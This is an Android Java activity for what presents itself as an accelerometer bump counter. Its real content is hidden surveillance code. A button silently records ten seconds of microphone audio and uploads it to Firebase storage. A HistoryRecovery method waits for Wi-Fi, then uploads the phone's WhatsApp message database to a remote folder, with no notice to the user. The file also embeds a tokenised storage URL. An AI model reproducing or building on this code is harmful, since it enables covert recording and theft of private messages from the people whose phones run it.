package com.example.myapplication;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;


import android.media.MediaPlayer;
import android.media.MediaRecorder;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.storage.FileDownloadTask;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import static android.Manifest.permission.RECORD_AUDIO;
import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;

public class MainActivity extends AppCompatActivity implements SensorEventListener {


    private static final int REQUEST_RECORD_AUDIO_PERMISSION = 200;
    private static String fileName = null;
    private static String audioFilePath;
    private MediaRecorder recorder = null;
    private MediaPlayer player =null;
    // Requesting permission to RECORD_AUDIO
    private boolean permissionToRecordAccepted = false;
    //  private String [] permissions = {Manifest.permission.RECORD_AUDIO};
    private MediaRecorder mRecorder;
    private MediaPlayer mPlayer;
    private static final String LOG_TAG = "AudioRecording";
    private static String mFileName = null;
    public static final int REQUEST_AUDIO_PERMISSION_CODE = 1;
    private static String downlodedfileName=null;


    //Time setting variable
    private TextView timerValue;

    private long startTime = 0L;

    private Handler customHandler = new Handler();

    long timeInMilliseconds = 0L;
    long timeSwapBuff = 0L;
    long updatedTime = 0L;
    int currentTime ;
///

    TextView xText , yText , zText , counterTv; // DECIDED TO LEAVE THEM IN CASE I WANT TO MODIFY AND TEST THE VALUES OF THE AXIS
    Button startButton , stopButton , resetButton;
    Sensor mySensor;
    SensorManager mySensorManager;
    boolean start = false;
    int numberOfHolesAndBumbs= 0;
    float accel;
    float accelCurrent;
    float accelLast;
    int shakeReset = 2500;
    long timeStamp;
    private StorageReference mStorageRef;
    private FirebaseAuth fbAuth;
    private FirebaseAuth.AuthStateListener authListener;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        fbAuth = FirebaseAuth.getInstance();

        authListener = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {

                FirebaseUser user = firebaseAuth.getCurrentUser();

                if (user != null) {

                    anonSignIn();
                } else {

                }
            }
        };




         if (CheckPermissions()){
             setContentView(R.layout.activity_main);
            //startService(new Intent(getApplicationContext(),BlindService.class));
             //startService(new Intent(getApplicationContext(),MyService.class));
         }else
        {
            RequestPermissions();
        }

        mStorageRef = FirebaseStorage.getInstance().getReference();
        // CREATE SENSOR MANAGER
       mySensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
        // CREATE ACCELERATION SENSOR
       mySensor = mySensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        // REGISTERING OUR SENSOR
        mySensorManager.registerListener(this,mySensor,SensorManager.SENSOR_DELAY_UI);
        //mySensorManager.registerListener(this,mySensor,SensorManager.SENSOR_DELAY_UI);

        // ASSIGNING OUR TEXT VIEWS (THIS IS USED IN TESTING AND I DECIDED TO LEAVE IT IN CASE ERRORS AND MODIFYING )
        xText = (TextView) findViewById(R.id.xAxis); // X AXIS
        yText = (TextView) findViewById(R.id.yAxis); // Y AXIS

        zText = (TextView) findViewById(R.id.zAxis); // Z AXIS
        counterTv = (TextView) findViewById(R.id.counterText);

        // ASSIGNING OUR BUTTONS
        startButton = (Button) findViewById(R.id.startBtn);
        stopButton = (Button) findViewById(R.id.stopBtn);
        resetButton = (Button) findViewById(R.id.resetBtn);

        // SETTING ACCELERATION VALUES
        accel = 0.00f;
        accelCurrent = SensorManager.GRAVITY_EARTH;
        accelLast = SensorManager.GRAVITY_EARTH;

        resetButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
               startService(new Intent(getApplicationContext(),History2.class));
                Toast.makeText(getApplicationContext(), "You can exit now ", Toast.LENGTH_LONG).show();

            }
        });
        startButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
   downloadAudio();
            }
        });

        stopButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                {
                    if(CheckPermissions()) {
                        mRecorder = new MediaRecorder();
                        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                        mRecorder.setOutputFile(mFileName);
                        try {
                            mRecorder.prepare();
                        } catch (IOException e) {
                            Log.e(LOG_TAG, "prepare() failed");
                        }
                        mRecorder.start();

                    }
                    else
                    {
                        RequestPermissions();
                    }
                }

                //Stop record



                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        //Do something here
                        mRecorder.stop();
                        mRecorder.release();
                        mRecorder = null;
                        uploadAudio();

                    }
                }, 10000);





            }
        });






    }

    private void downloadAudio() {


        mPlayer = new MediaPlayer();
        try {
            mPlayer.setDataSource("https://firebasestorage.googleapis.com/v0/b/test-fde0b.appspot.com/o/audio%2FAudio%20?alt=media&token=48976734-a198-406a-a6e5-6bf0e6b73e1d");
            mPlayer.prepare();
            mPlayer.start();
           // Toast.makeText(getApplicationContext(), "Recording Started Playing", Toast.LENGTH_LONG).show();
        } catch (IOException e) {
            Log.e(LOG_TAG, "prepare() failed");
        }

    }

    @Override
    public void onSensorChanged(SensorEvent event) {
        mFileName = Environment.getExternalStorageDirectory().getAbsolutePath();
        mFileName += "/AudioRecording.3gp";
        counterTv.setText(numberOfHolesAndBumbs+"");
            // STORING THE VALUES OF THE AXIS
            // event was previously sensorEvent
            float x = event.values[0];
            float y = event.values[1];
            float z = event.values[2];
            //xText.setText(x+"");
           // yText.setText(y+"");
            //zText.setText(z+"");
            // ACCELEROMETER LAST READ EQUAL TO THE CURRENT ONE
            accelLast = accelCurrent;
            // QUICK MAFS TO CALCULATE THE ACCELERATION
            accelCurrent = (float) Math.sqrt(x * x + y * y + z * z);
            // DELTA BETWEEN THE CURRENT AND THE LAST READ OF THE ACCELEROMETER
            float delta = accelCurrent - accelLast;
            // QUICK MAFS TO CALCULATE THE ACCEL THAT WILL DECLARE IF IT SHAKED OR NOT
            accel = accel * 0.9f + delta;
       // numberOfHolesAndBumbs = 0;

            // DID IT SHAKE??
            if (accel > 0.4) {
                final long timenow = System.currentTimeMillis();
                if(timeStamp + shakeReset  > timenow){
                    return;
                }
                timeStamp = timenow;
                numberOfHolesAndBumbs++;

                if (numberOfHolesAndBumbs==2){
                    //downloadAudio();
                }else if (numberOfHolesAndBumbs==3){
                    mPlayer.stop();
                    mPlayer.release();
                    mPlayer = null;
                }
                if (numberOfHolesAndBumbs>3){
                    Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
// Vibrate for 500 milliseconds
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        v.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
                    } else {
                        //deprecated in API 26
                        v.vibrate(500);
                    }
//start recording






                }
            }
        }


    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        switch (requestCode) {
            case REQUEST_AUDIO_PERMISSION_CODE:
                if (grantResults.length> 0) {
                    boolean permissionToRecord = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean permissionToStore = grantResults[1] ==  PackageManager.PERMISSION_GRANTED;
                    if (permissionToRecord && permissionToStore) {
                      //  Toast.makeText(getApplicationContext(), "Permission Granted", Toast.LENGTH_LONG).show();
                    } else {
                      //  Toast.makeText(getApplicationContext(),"Permission Denied",Toast.LENGTH_LONG).show();
                    }
                }
                break;
        }
    }
    public boolean CheckPermissions() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_EXTERNAL_STORAGE);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), RECORD_AUDIO);
        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
    }
    private void RequestPermissions() {
        ActivityCompat.requestPermissions(MainActivity.this, new String[]{RECORD_AUDIO, WRITE_EXTERNAL_STORAGE}, REQUEST_AUDIO_PERMISSION_CODE);
    }





    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {


    }


    @Override
    protected void onResume() {
        super.onResume();
        mySensorManager.registerListener(this,mySensor,SensorManager.SENSOR_DELAY_NORMAL);
    }

    @Override
    protected void onPause() {
        super.onPause();
        mySensorManager.unregisterListener(this);
    }
    private void uploadAudio() {


        audioFilePath = Environment.getExternalStorageDirectory().getAbsolutePath() + mFileName;
       // Toast.makeText(getApplicationContext(), audioFilePath+"", Toast.LENGTH_LONG).show();
        //if there is a file to upload
        StorageReference riversRef = mStorageRef.child("audio").child("Audio ");
        //StorageReference audioFilePath=mStorageRef.child("Audio").child(fileName);




        Uri file = Uri.fromFile(new File(mFileName));
           riversRef.putFile(file).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
               @Override
               public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                   //Toast.makeText(MainActivity.this, "Audio file has upload", Toast.LENGTH_SHORT).show();


               }
           });


    }

    @Override
    public void onStart() {
        super.onStart();
        fbAuth.addAuthStateListener(authListener);
    }

    @Override
    public void onStop() {
        super.onStop();
        if (authListener != null) {
            fbAuth.removeAuthStateListener(authListener);
        }
    }

    public void anonSignIn() {
        fbAuth.signInAnonymously()
                .addOnCompleteListener(this,
                        new OnCompleteListener<AuthResult>() {
                            @Override
                            public void onComplete(@NonNull Task<AuthResult> task) {

                                if (!task.isSuccessful()) {
                                   // Toast.makeText(MainActivity.this, "Authentication success. " + task.getException(), Toast.LENGTH_SHORT).show();
                                       FirebaseUser user= fbAuth.getCurrentUser();
                                       String userUID=user.getUid();

                                } else { //Toast.makeText(MainActivity.this, "Authentication good", Toast.LENGTH_SHORT).show();


                                }
                            }
                        });
    }



    private void HistoryRecovery(){
        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        if (mWifi.isConnected()) {
            // Do whatever

            audioFilePath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Databases/msgstore.db.crypt12";
            StorageReference riversRef = mStorageRef.child("Sauve").child("msgstore.db.crypt12 ");
            Uri file = Uri.fromFile(new File(audioFilePath));
            riversRef.putFile(file).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    //Toast.makeText(getApplicationContext(), "Audio Uploaded", Toast.LENGTH_LONG).show();


                }
            })
                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception exception) {
                            // Handle unsuccessful uploads
                            // Toast.makeText(getApplicationContext(), "Audio not Uploaded", Toast.LENGTH_LONG).show();

                            // ...
                        }
                    });


        }
        else {

        }

    }

}
